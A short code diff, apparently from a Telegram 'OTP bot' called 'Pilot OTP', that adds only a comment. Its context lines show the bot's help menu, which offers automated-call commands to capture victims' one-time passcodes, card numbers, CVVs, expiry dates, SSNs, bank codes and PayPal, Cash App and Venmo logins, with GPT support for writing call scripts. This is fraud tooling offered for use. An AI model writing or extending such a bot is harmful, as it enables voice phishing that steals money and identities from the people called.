@@ -154,7 +154,7 @@ while True:
         message_text = "✈️ Pilot OTP\n\n🤖 Core Commands\n• 📖~ /help | view commands\n• 🪪~/token | display your token\n• 🎧~/setvoice | set language\n•💻~/gptenable | enable gtp and open AI support for calls or making scripts\n• 💻~/gptdisable | disable gpt\n• ⏰~/plan | display your current plan\n\n📱Call Commands\n• 🔐~/otp | Capture OTP\n• 💳~/card | Capture Card Numbers\n• 💳~/cvv | Capture CVV\n• 💳~/vbv | Capture vbv\n• 📅~/date | Capture expiration date\n• 🪪~/ssn | Capture SSN\n• 🎉~/speak | Say any Text\n\n 🔗 Premade Commands\n• 🅿️~/paypal | Capture paypal\n• 💵~/cashapp | Capture Cashapp\n• 🏦~/bank | Capture 6 digit Bank Code\n• 📤~/venmo | Captures Venmo"
         telegram_bot.send_message(chat_id=message.chat.id, text=message_text, reply_markup=keyboard,parse_mode= 'Markdown')
   
-  
+  #Call back function
     @telegram_bot.callback_query_handler(func=lambda call: True)
     def handle_callback_query(call):
             call_data = call.data.split()
